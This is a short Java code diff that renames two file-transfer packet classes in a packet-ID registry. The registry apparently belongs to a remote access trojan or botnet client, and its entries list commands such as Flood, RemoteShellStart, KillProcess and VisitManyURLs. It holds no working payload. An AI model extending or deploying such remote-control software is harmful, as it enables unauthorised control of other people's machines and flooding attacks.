@@ -25,7 +25,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 18, Packet18Update.class);
 		incomingPackets.put((byte) 19, Packet19ListProcesses.class);
 		incomingPackets.put((byte) 20, Packet20KillProcess.class);
-		incomingPackets.put((byte) 21, Packet21GetFile.class);
+		incomingPackets.put((byte) 21, Packet21ClientUploadFile.class);
 		incomingPackets.put((byte) 22, Packet22Flood.class);
 		incomingPackets.put((byte) 23, Packet23RemoteShellStart.class);
 		incomingPackets.put((byte) 24, Packet24RemoteShellStop.class);
@@ -46,7 +46,7 @@ public abstract class AbstractIncomingPacket {
 		incomingPackets.put((byte) 39, Packet39VisitManyURLs.class);
 		incomingPackets.put((byte) 40, Packet40Thumbnail.class);
 		incomingPackets.put((byte) 41, Packet41SpecialDirectory.class);
-		incomingPackets.put((byte) 42, Packet42TakeFile.class);
+		incomingPackets.put((byte) 42, Packet42ClientDownloadFile.class);
 		incomingPackets.put((byte) 43, Packet43CreateDirectory.class);
 		incomingPackets.put((byte) 44, Packet44PlaySoundFromURL.class);
 		incomingPackets.put((byte) 45, Packet45Reconnect.class);
